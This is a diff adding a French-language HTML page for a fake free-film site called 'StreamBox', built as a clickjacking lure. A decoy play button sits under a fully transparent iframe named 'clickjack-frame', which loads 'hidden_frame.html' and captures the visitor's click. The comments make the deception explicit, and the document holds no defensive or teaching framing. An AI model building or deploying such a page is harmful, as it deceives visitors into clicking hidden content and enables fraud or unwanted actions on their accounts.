@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>StreamBox - Regarde tes films préférés</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #111;
+      color: white;
+      text-align: center;
+      margin: 0;
+    }
+
+    .container {
+      padding-top: 60px;
+    }
+
+    .video-player {
+      position: relative;
+      width: 800px;
+      height: 450px;
+      margin: 0 auto;
+      background: url('https://i.imgur.com/dYcYQ7E.jpeg') no-repeat center center;
+      background-size: cover;
+      border: 4px solid #444;
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
+    }
+
+    .fake-play-button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 120px;
+      height: 120px;
+      background: url('https://cdn-icons-png.flaticon.com/512/727/727245.png') no-repeat center center;
+      background-size: contain;
+      z-index: 2;
+      cursor: pointer;
+    }
+
+    iframe#clickjack-frame {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 800px;
+      height: 450px;
+      opacity: 0;
+      z-index: 3;
+      border: none;
+      pointer-events: auto;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Bienvenue sur StreamBox</h1>
+    <p>Regarde des films gratuitement et en HD !</p>
+
+    <div class="video-player">
+      <div class="fake-play-button"></div>
+      <!-- Iframe invisible placé au-dessus du bouton play -->
+      <iframe id="clickjack-frame" src="hidden_frame.html"></iframe>
+    </div>
+  </div>
+</body>
+</html>
